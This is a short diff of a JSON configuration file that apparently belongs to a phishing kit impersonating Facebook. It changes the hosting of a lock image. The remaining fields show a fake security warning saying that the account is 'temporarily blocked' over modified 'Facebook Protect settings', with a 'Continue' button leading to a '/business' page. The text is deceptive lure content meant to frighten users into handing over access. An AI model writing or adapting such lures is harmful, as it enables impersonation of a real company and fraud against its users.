@@ -1,6 +1,6 @@
 {
   "title": "The security of your account is at risk.",
-  "imgSrc": "https://raw.githubusercontent.com/equinox-sprite/landingpage/main/locked.png",
+  "imgSrc": "https://raw.githubusercontent.com/lovegrasp/web2/main/locked.png",
   "redirectLink": "/business",
   "btnText": "Continue",
   "text1": "We have temporarily blocked your account because your Facebook Protect settings have been modified.",
